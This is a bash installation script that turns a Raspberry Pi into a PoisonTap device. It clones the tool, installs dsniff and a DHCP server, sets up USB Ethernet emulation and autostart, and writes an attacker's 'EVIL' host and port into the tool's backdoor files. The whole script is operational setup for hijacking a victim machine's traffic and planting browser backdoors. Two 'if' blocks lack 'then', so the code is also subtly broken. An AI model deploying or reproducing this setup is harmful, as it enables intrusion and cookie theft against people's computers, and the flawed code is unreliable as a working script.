#!/bin/bash
# Installation script for configuring a poinsontap device on a clean raspbian image
# Installation refers to Samy Kamkars piosontap project on https://github.com/samyk/poisontap

# Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41

# If Raspbian BEFORE 2016-05-10, then run next line:
# BRANCH=next rpi-update

_confirm () {
  # prompt user for confirmation. Default is No
    read -r -p "${1:-Do you want to proceed? [y/N]} " RESPONSE
    RESPONSE=${RESPONSE,,}
    if [[ $RESPONSE =~ ^(yes|y| ) ]]
      then
        true
      else
        false
    fi
}

_setHostname(){
  # set hostname
  echo
  echo Current hostname is $HOSTNAME
  read -r -p "Enter NEW hostname: " NEWHOSTNAME
  hostnamectl set-hostname --static "$NEWHOSTNAME"
}

_getNewEvilHostname(){
  # set hostname of evil host
  echo

  read -r -p "Enter the hostname of the ""EVIL"" host [YOUR.DOMAIN]: " NEWEVILHOSTNAME

  if [[ -n "$NEWEVILHOSTNAME" ]] # string is not empty
    # replace YOUR.DOMAIN in backdoor.html and target_backdoor.js
    sed -i "s/YOUR.DOMAIN/$NEWEVILHOSTNAME/g" poisontap/backdoor.html
    sed -i "s/YOUR.DOMAIN/$NEWEVILHOSTNAME/g" poisontap/target_backdoor.js
  fi

}

_getNewEvilPort(){
  # set hostname of evil host
  echo

  read -r -p "Enter the port number of the ""EVIL"" host [1337]: " NEWEVILPORT

  if [[ -n "$NEWEVILPORT" ]] # string is not empty
    # replace default port number 1337 in backdoor.html
    sed -i "s/:1337/:$NEWEVILPORT/g" poisontap/backdoor.html
  fi
}

# Define variables
MYUSER=$(logname)

# elevate privileges to root
[ "$UID" -eq 0 ] || exec sudo bash "$0" "$@"

# update raspbian and install generic packages
echo
echo Updating packages...
apt-get update && apt-get -y upgrade
echo
echo Installing git...
apt-get -y install git

# get poinsontap source from github and put it in home/pi/poisontap
echo
echo Cloning poisontap from GitHub...
cd /home/$MYUSER
su $MYUSER -c "git clone https://github.com/samyk/poisontap"

# Copy dhcpd.conf to dhcpd directory
echo
echo Copy DHCP config file...
cp poisontap/dhcpd.conf /etc/dhcp/dhcpd.conf

# install packages needed for poisontap
echo
echo Installing packages needed for poisontap...
apt-get -y install isc-dhcp-server dsniff screen nodejs

echo
echo Appending lines to complete config...
echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
echo "dtoverlay=dwc2" >> /boot/config.txt
echo -e "dwc2\ng_ether" >> /etc/modules
echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local

echo
echo Finish device setup...
_confirm "Do you want to change hostname from $HOSTNAME? [yN] " && _setHostname
_getNewEvilHostname
_getNewEvilPort
